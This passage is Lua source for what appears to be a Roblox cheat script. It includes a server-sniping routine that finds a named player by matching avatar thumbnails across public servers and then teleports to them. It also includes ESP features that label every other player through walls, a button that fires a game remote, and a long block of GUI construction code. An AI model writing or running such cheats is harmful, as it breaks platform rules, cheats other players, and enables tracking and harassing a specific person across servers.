        searching = false
        Status("Cancelled")
        return
    end

    if searching then
        confirm = true
        local old = StartButton.Text
        Status("Click again to confirm.")
        task.delay(5, function()
            if "Click again to confirm." == StartButton.Text then
                confirm = false
                StartButton.Text = old
            end
        end)
        return
    end

    searching = true

    -- User ID
    Status("Getting user id...")

    local s, Username, UserId = pcall(function()
        local userId = tonumber(UsernameBox.Text) or Players:GetUserIdFromNameAsync(UsernameBox.Text)
        local username = Players:GetNameFromUserIdAsync(userId)
        return username, userId
    end)
    if not s then
        return Status("Username or UserId does not exist!", 3)
    end

    local s, thumbUrl = pcall(Players.GetUserThumbnailAsync, Players, UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size150x150)

    UsernameLabel.Text = Username
    UserIdLabel.Text = UserId
    GamerPicture.Image = s and thumbUrl or ""

    Status("Getting user's thumbnail...")
    local s, response = HttpGet("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. UserId .. "&format=Png&size=150x150&isCircular=false")
    local thumbnail = s and response['data'][1].imageUrl

    Status("Searching for (".. UserId ..")")

    -- Place ID
    Status("Getting place id...")

    local placeId = tonumber(PlaceIdBox.Text)

    if PlaceIdBox.Text:gsub("%s", "") == "" then
        placeId = game.PlaceId
        PlaceIdBox.Text = tostring(game.PlaceId)
    elseif not placeId then
        Status("Invalid place id", 3)
        return
    end

    Status("Searching...")
    local cursor = nil
    local searched = 0
    local maxSearchs = 0
    local players = 0
    -- Server search
    while searching do
        if not Screenguini or not Screenguini.Parent then
            break
        end
        local s, result = getServers(placeId, cursor)

        if s then
            local servers = result.data
            if result.nextPageCursor then
                cursor = result.nextPageCursor
            end

            if StartButton.Text:match("Searching") then
                maxSearchs = maxSearchs + #servers
                Status(searched .."/".. maxSearchs .." servers scanned, players found: ".. players)
            end

            -- Search all servers
            for index, server in ipairs(servers) do
                local function fetchServer()
                    local s, thumbs = fetchThumbs(server.playerTokens)
                    if s then
                        players = players + #thumbs
                        for _, playerThumb in ipairs(thumbs) do
                            if playerThumb.imageUrl then
                                if playerThumb.imageUrl == thumbnail then
                                    searching = false
                                    Status("Found player, teleporting...")

                                    teleport(placeId, server.id)
                                    local try = 0
                                    if Players.LocalPlayer then -- Imagine executing in loading screen without Player lmao
                                        Players.LocalPlayer.OnTeleport:Connect(function(teleportState)
                                            if teleportState == Enum.TeleportState.Failed then
                                                try = try + 1
                                                Status("Teleport failed, try #".. try)
                                                teleport(placeId, server.id)
                                            end
                                        end)
                                    end
                                end
                            else
                                print("token failed, id:", playerThumb.requestId, playerThumb.state, playerThumb.errorMessage)
                            end
                        end
                    else
                        print("token failed", s, thumbs)
                    end
                end
                searched = searched + 1
                if index % threads ~= 0 then
                    task.spawn(fetchServer)
                    task.wait()
                else
                    fetchServer()
                end

                if searching then
                    Status(searched .."/".. maxSearchs .." servers scanned, players found: ".. players)
                end
            end

            -- Player not found
            if not cursor then
                break
            end
        else
            return Status("Failed to find servers", 3)
        end

        task.wait()
    end

    if searching then
        Status("Failed to find ".. Username ..", maybe in a vip server", 3)
    end
end)
  	end    
})
local Section = JogadorTab:AddSection({
	Name = "Reset Player (Character)"
})
JogadorTab:AddButton({
	Name = "Reviver (!)",
	Callback = function()
        game:GetService("ReplicatedStorage").Remotes.Menu:FireServer()
        wait(000000.5)
  	end    
})
    EspTab:AddButton({
        Name = "Esp V3",
        Callback = function()
             
--- Tut
 
local esp_settings = { ---- table for esp settings 
textsize = 8,
colour = 255,255,255
}

local gui = Instance.new("BillboardGui")
local esp = Instance.new("TextLabel",gui) ---- new instances to make the billboard gui and the textlabel



gui.Name = "Cracked esp"; ---- properties of the esp
gui.ResetOnSpawn = false
gui.AlwaysOnTop = true;
gui.LightInfluence = 0;
gui.Size = UDim2.new(1.75, 0, 1.75, 0);
esp.BackgroundColor3 = Color3.fromRGB(255, 255, 255);
esp.Text = ""
esp.Size = UDim2.new(0.0001, 0.00001, 0.0001, 0.00001);
esp.BorderSizePixel = 4;
esp.BorderColor3 = Color3.new(esp_settings.colour)
esp.BorderSizePixel = 0
esp.Font = "GothamSemibold"
esp.TextSize = esp_settings.textsize
esp.TextColor3 = Color3.fromRGB(esp_settings.colour) -- text colour

game:GetService("RunService").RenderStepped:Connect(function() ---- loops faster than a while loop :)
for i,v in pairs (game:GetService("Players"):GetPlayers()) do
    if v ~= game:GetService("Players").LocalPlayer and v.Character.Head:FindFirstChild("Cracked esp")==nil  then -- craeting checks for team check, local player etc
        esp.Text = "{"..v.Name.."}"
        gui:Clone().Parent = v.Character.Head
end
end
end)
              end              
        })        
    EspTab:AddButton({
        Name = "Esp V4 ",
        Callback = function()
            local custom_theme = {} --soon
 
local function CreateInstance(cls,props)
local inst = Instance.new(cls)
for i,v in pairs(props) do
    inst[i] = v
end
return inst
end
    
local age1 = CreateInstance('ScreenGui',{DisplayOrder=0,Enabled=true,ResetOnSpawn=true,Name='age1', Parent=game.CoreGui})
local p_visuals = CreateInstance('Frame',{Style=Enum.FrameStyle.Custom,Active=true,AnchorPoint=Vector2.new(0, 0),BackgroundColor3=Color3.new(0.121569, 0.12549, 0.172549),BackgroundTransparency=0,BorderColor3=Color3.new(1, 0, 0.498039),BorderSizePixel=2,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0, 50, 0, 60),Rotation=0,Selectable=false,Size=UDim2.new(0, 200, 0, 254),SizeConstraint=Enum.SizeConstraint.RelativeXY,Visible=true,ZIndex=1,Name = 'p_visuals',Parent = age1})
local UIListLayout = CreateInstance('UIListLayout', {Padding = UDim.new(0, 1), FillDirection = Enum.FillDirection.Vertical, HorizontalAlignment = Enum.HorizontalAlignment.Left, SortOrder = Enum.SortOrder.LayoutOrder, VerticalAlignment = Enum.VerticalAlignment.Top, Name = 'UIListLayout', Parent = p_visuals })
local title1 = CreateInstance('TextLabel',{Font=Enum.Font.GothamBlack,FontSize=Enum.FontSize.Size18,Text='Player visuals',TextColor3=Color3.new(1, 1, 1),TextScaled=false,TextSize=18,TextStrokeColor3=Color3.new(0, 0, 0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=Enum.TextXAlignment.Left,TextYAlignment=Enum.TextYAlignment.Center,Active=true,AnchorPoint=Vector2.new(0, 0),BackgroundColor3=Color3.new(1, 0, 0.498039),BackgroundTransparency=0,BorderColor3=Color3.new(1, 0, 0.498039),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0, 0, 0, 0),Rotation=0,Selectable=true,Size=UDim2.new(1, 0, 0, 24),SizeConstraint=Enum.SizeConstraint.RelativeXY,Visible=true,ZIndex=1,Name='title1',Parent = p_visuals})
local b_b = CreateInstance('TextButton',{Font=Enum.Font.SourceSans,FontSize=Enum.FontSize.Size18,Text='Bounding box',TextColor3=Color3.new(1, 0, 0.498039),TextScaled=false,TextSize=16,TextStrokeColor3=Color3.new(0, 0, 0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=Enum.TextXAlignment.Left,TextYAlignment=Enum.TextYAlignment.Center,AutoButtonColor=true,Modal=false,Selected=false,Style=Enum.ButtonStyle.Custom,Active=false,AnchorPoint=Vector2.new(0, 0),BackgroundColor3=Color3.new(1, 0, 0.498039),BackgroundTransparency=1,BorderColor3=Color3.new(1, 0, 0.498039),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0, 0, 0, 0),Rotation=0,Selectable=true,Size=UDim2.new(1, -2, 0, 18),SizeConstraint=Enum.SizeConstraint.RelativeXY,Visible=true,ZIndex=1,Name='b_b',Parent = p_visuals})
local v = CreateInstance('TextLabel',{Font=Enum.Font.Gotham,FontSize=Enum.FontSize.Size14,Text='OFF',TextColor3=Color3.new(1, 0, 0),TextScaled=false,TextSize=14,TextStrokeColor3=Color3.new(0, 0, 0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=Enum.TextXAlignment.Right,TextYAlignment=Enum.TextYAlignment.Center,Active=false,AnchorPoint=Vector2.new(1, 0),BackgroundColor3=Color3.new(1, 1, 1),BackgroundTransparency=1,BorderColor3=Color3.new(0.105882, 0.164706, 0.207843),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(1, 0, 0, 0),Rotation=0,Selectable=false,Size=UDim2.new(0, 18, 0, 18),SizeConstraint=Enum.SizeConstraint.RelativeXY,Visible=true,ZIndex=1,Name='v',Parent = b_b})
local b_f = CreateInstance('TextButton',{Font=Enum.Font.SourceSans,FontSize=Enum.FontSize.Size18,Text='Fill alpha',TextColor3=Color3.new(1, 0, 0.498039),TextScaled=false,TextSize=16,TextStrokeColor3=Color3.new(0, 0, 0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=Enum.TextXAlignment.Left,TextYAlignment=Enum.TextYAlignment.Center,AutoButtonColor=true,Modal=false,Selected=false,Style=Enum.ButtonStyle.Custom,Active=false,AnchorPoint=Vector2.new(0, 0),BackgroundColor3=Color3.new(1, 0, 0.498039),BackgroundTransparency=1,BorderColor3=Color3.new(1, 0, 0.498039),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0, 0, 0, 0),Rotation=0,Selectable=true,Size=UDim2.new(1, -2, 0, 18),SizeConstraint=Enum.SizeConstraint.RelativeXY,Visible=true,ZIndex=1,Name='b_f',Parent = p_visuals})
local v = CreateInstance('TextLabel',{Font=Enum.Font.Gotham,FontSize=Enum.FontSize.Size14,Text='OFF',TextColor3=Color3.new(1, 0, 0),TextScaled=false,TextSize=14,TextStrokeColor3=Color3.new(0, 0, 0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=Enum.TextXAlignment.Right,TextYAlignment=Enum.TextYAlignment.Center,Active=false,AnchorPoint=Vector2.new(1, 0),BackgroundColor3=Color3.new(1, 1, 1),BackgroundTransparency=1,BorderColor3=Color3.new(0.105882, 0.164706, 0.207843),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(1, 0, 0, 0),Rotation=0,Selectable=false,Size=UDim2.new(0, 18, 0, 18),SizeConstraint=Enum.SizeConstraint.RelativeXY,Visible=true,ZIndex=1,Name='v',Parent = b_f})
local b_rt = CreateInstance('TextButton',{Font=Enum.Font.SourceSans,FontSize=Enum.FontSize.Size18,Text='Render team',TextColor3=Color3.new(1, 0, 0.498039),TextScaled=false,TextSize=16,TextStrokeColor3=Color3.new(0, 0, 0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=Enum.TextXAlignment.Left,TextYAlignment=Enum.TextYAlignment.Center,AutoButtonColor=true,Modal=false,Selected=false,Style=Enum.ButtonStyle.Custom,Active=false,AnchorPoint=Vector2.new(0, 0),BackgroundColor3=Color3.new(1, 0, 0.498039),BackgroundTransparency=1,BorderColor3=Color3.new(1, 0, 0.498039),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0, 0, 0, 0),Rotation=0,Selectable=true,Size=UDim2.new(1, -2, 0, 18),SizeConstraint=Enum.SizeConstraint.RelativeXY,Visible=true,ZIndex=1,Name='b_rt',Parent = p_visuals})
local v = CreateInstance('TextLabel',{Font=Enum.Font.Gotham,FontSize=Enum.FontSize.Size14,Text='OFF',TextColor3=Color3.new(1, 0, 0),TextScaled=false,TextSize=14,TextStrokeColor3=Color3.new(0, 0, 0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=Enum.TextXAlignment.Right,TextYAlignment=Enum.TextYAlignment.Center,Active=false,AnchorPoint=Vector2.new(1, 0),BackgroundColor3=Color3.new(1, 1, 1),BackgroundTransparency=1,BorderColor3=Color3.new(0.105882, 0.164706, 0.207843),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(1, 0, 0, 0),Rotation=0,Selectable=false,Size=UDim2.new(0, 18, 0, 18),SizeConstraint=Enum.SizeConstraint.RelativeXY,Visible=true,ZIndex=1,Name='v',Parent = b_rt})
local b_tc = CreateInstance('TextButton',{Font=Enum.Font.SourceSans,FontSize=Enum.FontSize.Size18,Text='Use TeamColor',TextColor3=Color3.new(1, 0, 0.498039),TextScaled=false,TextSize=16,TextStrokeColor3=Color3.new(0, 0, 0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=Enum.TextXAlignment.Left,TextYAlignment=Enum.TextYAlignment.Center,AutoButtonColor=true,Modal=false,Selected=false,Style=Enum.ButtonStyle.Custom,Active=false,AnchorPoint=Vector2.new(0, 0),BackgroundColor3=Color3.new(1, 0, 0.498039),BackgroundTransparency=1,BorderColor3=Color3.new(1, 0, 0.498039),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0, 0, 0, 0),Rotation=0,Selectable=true,Size=UDim2.new(1, -2, 0, 18),SizeConstraint=Enum.SizeConstraint.RelativeXY,Visible=true,ZIndex=1,Name='b_tc',Parent = p_visuals})
local v = CreateInstance('TextLabel',{Font=Enum.Font.Gotham,FontSize=Enum.FontSize.Size14,Text='OFF',TextColor3=Color3.new(1, 0, 0),TextScaled=false,TextSize=14,TextStrokeColor3=Color3.new(0, 0, 0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=Enum.TextXAlignment.Right,TextYAlignment=Enum.TextYAlignment.Center,Active=false,AnchorPoint=Vector2.new(1, 0),BackgroundColor3=Color3.new(1, 1, 1),BackgroundTransparency=1,BorderColor3=Color3.new(0.105882, 0.164706, 0.207843),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(1, 0, 0, 0),Rotation=0,Selectable=false,Size=UDim2.new(0, 18, 0, 18),SizeConstraint=Enum.SizeConstraint.RelativeXY,Visible=true,ZIndex=1,Name='v',Parent = b_tc})
local b_sn = CreateInstance('TextButton',{Font=Enum.Font.SourceSans,FontSize=Enum.FontSize.Size18,Text='Show name',TextColor3=Color3.new(1, 0, 0.498039),TextScaled=false,TextSize=16,TextStrokeColor3=Color3.new(0, 0, 0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=Enum.TextXAlignment.Left,TextYAlignment=Enum.TextYAlignment.Center,AutoButtonColor=true,Modal=false,Selected=false,Style=Enum.ButtonStyle.Custom,Active=false,AnchorPoint=Vector2.new(0, 0),BackgroundColor3=Color3.new(1, 0, 0.498039),BackgroundTransparency=1,BorderColor3=Color3.new(1, 0, 0.498039),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0, 0, 0, 0),Rotation=0,Selectable=true,Size=UDim2.new(1, -2, 0, 18),SizeConstraint=Enum.SizeConstraint.RelativeXY,Visible=true,ZIndex=1,Name='b_sn',Parent = p_visuals})
local v = CreateInstance('TextLabel',{Font=Enum.Font.Gotham,FontSize=Enum.FontSize.Size14,Text='OFF',TextColor3=Color3.new(1, 0, 0),TextScaled=false,TextSize=14,TextStrokeColor3=Color3.new(0, 0, 0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=Enum.TextXAlignment.Right,TextYAlignment=Enum.TextYAlignment.Center,Active=false,AnchorPoint=Vector2.new(1, 0),BackgroundColor3=Color3.new(1, 1, 1),BackgroundTransparency=1,BorderColor3=Color3.new(0.105882, 0.164706, 0.207843),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(1, 0, 0, 0),Rotation=0,Selectable=false,Size=UDim2.new(0, 18, 0, 18),SizeConstraint=Enum.SizeConstraint.RelativeXY,Visible=true,ZIndex=1,Name='v',Parent = b_sn})
local b_sd = CreateInstance('TextButton',{Font=Enum.Font.SourceSans,FontSize=Enum.FontSize.Size18,Text='Show distance',TextColor3=Color3.new(1, 0, 0.498039),TextScaled=false,TextSize=16,TextStrokeColor3=Color3.new(0, 0, 0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=Enum.TextXAlignment.Left,TextYAlignment=Enum.TextYAlignment.Center,AutoButtonColor=true,Modal=false,Selected=false,Style=Enum.ButtonStyle.Custom,Active=false,AnchorPoint=Vector2.new(0, 0),BackgroundColor3=Color3.new(1, 0, 0.498039),BackgroundTransparency=1,BorderColor3=Color3.new(1, 0, 0.498039),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0, 0, 0, 0),Rotation=0,Selectable=true,Size=UDim2.new(1, -2, 0, 18),SizeConstraint=Enum.SizeConstraint.RelativeXY,Visible=true,ZIndex=1,Name='b_sd',Parent = p_visuals})
local v = CreateInstance('TextLabel',{Font=Enum.Font.Gotham,FontSize=Enum.FontSize.Size14,Text='OFF',TextColor3=Color3.new(1, 0, 0),TextScaled=false,TextSize=14,TextStrokeColor3=Color3.new(0, 0, 0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=Enum.TextXAlignment.Right,TextYAlignment=Enum.TextYAlignment.Center,Active=false,AnchorPoint=Vector2.new(1, 0),BackgroundColor3=Color3.new(1, 1, 1),BackgroundTransparency=1,BorderColor3=Color3.new(0.105882, 0.164706, 0.207843),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(1, 0, 0, 0),Rotation=0,Selectable=false,Size=UDim2.new(0, 18, 0, 18),SizeConstraint=Enum.SizeConstraint.RelativeXY,Visible=true,ZIndex=1,Name='v',Parent = b_sd})
local b_sh = CreateInstance('TextButton',{Font=Enum.Font.SourceSans,FontSize=Enum.FontSize.Size18,Text='Show health',TextColor3=Color3.new(1, 0, 0.498039),TextScaled=false,TextSize=16,TextStrokeColor3=Color3.new(0, 0, 0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=Enum.TextXAlignment.Left,TextYAlignment=Enum.TextYAlignment.Center,AutoButtonColor=true,Modal=false,Selected=false,Style=Enum.ButtonStyle.Custom,Active=false,AnchorPoint=Vector2.new(0, 0),BackgroundColor3=Color3.new(1, 0, 0.498039),BackgroundTransparency=1,BorderColor3=Color3.new(1, 0, 0.498039),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0, 0, 0, 0),Rotation=0,Selectable=true,Size=UDim2.new(1, -2, 0, 18),SizeConstraint=Enum.SizeConstraint.RelativeXY,Visible=true,ZIndex=1,Name='b_sh',Parent = p_visuals})
local v = CreateInstance('TextLabel',{Font=Enum.Font.Gotham,FontSize=Enum.FontSize.Size14,Text='OFF',TextColor3=Color3.new(1, 0, 0),TextScaled=false,TextSize=14,TextStrokeColor3=Color3.new(0, 0, 0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=Enum.TextXAlignment.Right,TextYAlignment=Enum.TextYAlignment.Center,Active=false,AnchorPoint=Vector2.new(1, 0),BackgroundColor3=Color3.new(1, 1, 1),BackgroundTransparency=1,BorderColor3=Color3.new(0.105882, 0.164706, 0.207843),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(1, 0, 0, 0),Rotation=0,Selectable=false,Size=UDim2.new(0, 18, 0, 18),SizeConstraint=Enum.SizeConstraint.RelativeXY,Visible=true,ZIndex=1,Name='v',Parent = b_sh})
local b_ht = CreateInstance('TextButton',{Font=Enum.Font.SourceSans,FontSize=Enum.FontSize.Size18,Text='Health type',TextColor3=Color3.new(1, 0, 0.498039),TextScaled=false,TextSize=16,TextStrokeColor3=Color3.new(0, 0, 0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=Enum.TextXAlignment.Left,TextYAlignment=Enum.TextYAlignment.Center,AutoButtonColor=true,Modal=false,Selected=false,Style=Enum.ButtonStyle.Custom,Active=false,AnchorPoint=Vector2.new(0, 0),BackgroundColor3=Color3.new(1, 0, 0.498039),BackgroundTransparency=1,BorderColor3=Color3.new(1, 0, 0.498039),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0, 0, 0, 0),Rotation=0,Selectable=true,Size=UDim2.new(1, -2, 0, 18),SizeConstraint=Enum.SizeConstraint.RelativeXY,Visible=true,ZIndex=1,Name='b_ht',Parent = p_visuals})
local v = CreateInstance('TextLabel',{Font=Enum.Font.SourceSans,FontSize=Enum.FontSize.Size18,Text='Text',TextColor3=Color3.new(0, 1, 1),TextScaled=false,TextSize=16,TextStrokeColor3=Color3.new(0, 0, 0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=Enum.TextXAlignment.Right,TextYAlignment=Enum.TextYAlignment.Center,Active=false,AnchorPoint=Vector2.new(1, 0),BackgroundColor3=Color3.new(1, 1, 1),BackgroundTransparency=1,BorderColor3=Color3.new(0.105882, 0.164706, 0.207843),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(1, 0, 0, 0),Rotation=0,Selectable=false,Size=UDim2.new(0, 18, 0, 18),SizeConstraint=Enum.SizeConstraint.RelativeXY,Visible=true,ZIndex=1,Name='v',Parent = b_ht})
local b_f_t = CreateInstance('TextButton',{Font=Enum.Font.SourceSans,FontSize=Enum.FontSize.Size18,Text='Fill transparency',TextColor3=Color3.new(1, 0, 0.498039),TextScaled=false,TextSize=16,TextStrokeColor3=Color3.new(0, 0, 0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=Enum.TextXAlignment.Left,TextYAlignment=Enum.TextYAlignment.Center,AutoButtonColor=true,Modal=false,Selected=false,Style=Enum.ButtonStyle.Custom,Active=false,AnchorPoint=Vector2.new(0, 0),BackgroundColor3=Color3.new(1, 0, 0.498039),BackgroundTransparency=1,BorderColor3=Color3.new(1, 0, 0.498039),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0, 0, 0, 0),Rotation=0,Selectable=true,Size=UDim2.new(1, -2, 0, 18),SizeConstraint=Enum.SizeConstraint.RelativeXY,Visible=true,ZIndex=1,Name='b_f_t',Parent = p_visuals})
local v = CreateInstance('TextLabel',{Font=Enum.Font.Gotham,FontSize=Enum.FontSize.Size14,Text='1',TextColor3=Color3.new(0, 1, 1),TextScaled=false,TextSize=14,TextStrokeColor3=Color3.new(0, 0, 0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=Enum.TextXAlignment.Right,TextYAlignment=Enum.TextYAlignment.Center,Active=false,AnchorPoint=Vector2.new(1, 0),BackgroundColor3=Color3.new(1, 1, 1),BackgroundTransparency=1,BorderColor3=Color3.new(0.105882, 0.164706, 0.207843),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(1, 0, 0, 0),Rotation=0,Selectable=false,Size=UDim2.new(0, 18, 0, 18),SizeConstraint=Enum.SizeConstraint.RelativeXY,Visible=true,ZIndex=1,Name='v',Parent = b_f_t})
local title1_2 = CreateInstance('TextLabel',{Font=Enum.Font.SourceSansBold,FontSize=Enum.FontSize.Size18,Text='ESP',TextColor3=Color3.new(1, 0, 0.498039),TextScaled=false,TextSize=18,TextStrokeColor3=Color3.new(0, 0, 0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=Enum.TextXAlignment.Left,TextYAlignment=Enum.TextYAlignment.Center,Active=false,AnchorPoint=Vector2.new(0, 0),BackgroundColor3=Color3.new(0.121569, 0.12549, 0.172549),BackgroundTransparency=0,BorderColor3=Color3.new(1, 0, 0.498039),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0, 0, 0, 0),Rotation=0,Selectable=true,Size=UDim2.new(1, 0, 0, 18),SizeConstraint=Enum.SizeConstraint.RelativeXY,Visible=true,ZIndex=1,Name='title1_2',Parent = p_visuals})
local b_ct = CreateInstance('TextLabel',{Font=Enum.Font.SourceSans,FontSize=Enum.FontSize.Size18,Text='Team color',TextColor3=Color3.new(1, 0, 0.498039),TextScaled=false,TextSize=16,TextStrokeColor3=Color3.new(0, 0, 0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=Enum.TextXAlignment.Left,TextYAlignment=Enum.TextYAlignment.Center,Active=false,AnchorPoint=Vector2.new(0, 0),BackgroundColor3=Color3.new(1, 0, 0.498039),BackgroundTransparency=1,BorderColor3=Color3.new(1, 0, 0.498039),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0, 0, 0, 0),Rotation=0,Selectable=true,Size=UDim2.new(1, -2, 0, 18),SizeConstraint=Enum.SizeConstraint.RelativeXY,Visible=true,ZIndex=1,Name='b_ct',Parent = p_visuals})
local ct_b = CreateInstance('TextBox',{ClearTextOnFocus=true,Font=Enum.Font.Gotham,FontSize=Enum.FontSize.Size14,MultiLine=false,Text='',TextColor3=Color3.new(0, 0, 1), PlaceholderText='', PlaceholderColor3=Color3.new(0, 0, 1),TextScaled=false,TextSize=14,TextStrokeColor3=Color3.new(0, 0, 0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=Enum.TextXAlignment.Center,TextYAlignment=Enum.TextYAlignment.Center,Active=true,AnchorPoint=Vector2.new(1, 0),BackgroundColor3=Color3.new(0.121569, 0.12549, 0.172549),BackgroundTransparency=0,BorderColor3=Color3.new(1, 0, 0.498039),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(1, -2, 0, 2),Rotation=0,Selectable=true,Size=UDim2.new(0, 27, 0, 14),SizeConstraint=Enum.SizeConstraint.RelativeXY,Visible=true,ZIndex=1,Name='ct_b',Parent = b_ct})
local ct_g = CreateInstance('TextBox',{ClearTextOnFocus=true,Font=Enum.Font.Gotham,FontSize=Enum.FontSize.Size14,MultiLine=false,Text='',TextColor3=Color3.new(0, 1, 0), PlaceholderText='', PlaceholderColor3=Color3.new(0, 1, 0),TextScaled=false,TextSize=14,TextStrokeColor3=Color3.new(0, 0, 0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=Enum.TextXAlignment.Center,TextYAlignment=Enum.TextYAlignment.Center,Active=true,AnchorPoint=Vector2.new(1, 0),BackgroundColor3=Color3.new(0.121569, 0.12549, 0.172549),BackgroundTransparency=0,BorderColor3=Color3.new(1, 0, 0.498039),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(1, -29, 0, 2),Rotation=0,Selectable=true,Size=UDim2.new(0, 27, 0, 14),SizeConstraint=Enum.SizeConstraint.RelativeXY,Visible=true,ZIndex=1,Name='ct_g',Parent = b_ct})
local ct_r = CreateInstance('TextBox',{ClearTextOnFocus=true,Font=Enum.Font.Gotham,FontSize=Enum.FontSize.Size14,MultiLine=false,Text='',TextColor3=Color3.new(1, 0, 0), PlaceholderText='', PlaceholderColor3=Color3.new(1, 0, 0),TextScaled=false,TextSize=14,TextStrokeColor3=Color3.new(0, 0, 0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=Enum.TextXAlignment.Center,TextYAlignment=Enum.TextYAlignment.Center,Active=true,AnchorPoint=Vector2.new(1, 0),BackgroundColor3=Color3.new(0.121569, 0.12549, 0.172549),BackgroundTransparency=0,BorderColor3=Color3.new(1, 0, 0.498039),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(1, -56, 0, 2),Rotation=0,Selectable=true,Size=UDim2.new(0, 27, 0, 14),SizeConstraint=Enum.SizeConstraint.RelativeXY,Visible=true,ZIndex=1,Name='ct_r',Parent = b_ct})
local b_ce = CreateInstance('TextLabel',{Font=Enum.Font.SourceSans,FontSize=Enum.FontSize.Size18,Text='Enemy color',TextColor3=Color3.new(1, 0, 0.498039),TextScaled=false,TextSize=16,TextStrokeColor3=Color3.new(0, 0, 0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=Enum.TextXAlignment.Left,TextYAlignment=Enum.TextYAlignment.Center,Active=false,AnchorPoint=Vector2.new(0, 0),BackgroundColor3=Color3.new(1, 0, 0.498039),BackgroundTransparency=1,BorderColor3=Color3.new(1, 0, 0.498039),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0, 0, 0, 0),Rotation=0,Selectable=true,Size=UDim2.new(1, -2, 0, 18),SizeConstraint=Enum.SizeConstraint.RelativeXY,Visible=true,ZIndex=1,Name='b_ce',Parent = p_visuals})
local ce_b = CreateInstance('TextBox',{ClearTextOnFocus=true,Font=Enum.Font.Gotham,FontSize=Enum.FontSize.Size14,MultiLine=false,Text='',TextColor3=Color3.new(0, 0, 1), PlaceholderText='', PlaceholderColor3=Color3.new(0, 0, 1),TextScaled=false,TextSize=14,TextStrokeColor3=Color3.new(0, 0, 0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=Enum.TextXAlignment.Center,TextYAlignment=Enum.TextYAlignment.Center,Active=true,AnchorPoint=Vector2.new(1, 0),BackgroundColor3=Color3.new(0.121569, 0.12549, 0.172549),BackgroundTransparency=0,BorderColor3=Color3.new(1, 0, 0.498039),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(1, -2, 0, 2),Rotation=0,Selectable=true,Size=UDim2.new(0, 27, 0, 14),SizeConstraint=Enum.SizeConstraint.RelativeXY,Visible=true,ZIndex=1,Name='ce_b',Parent = b_ce})
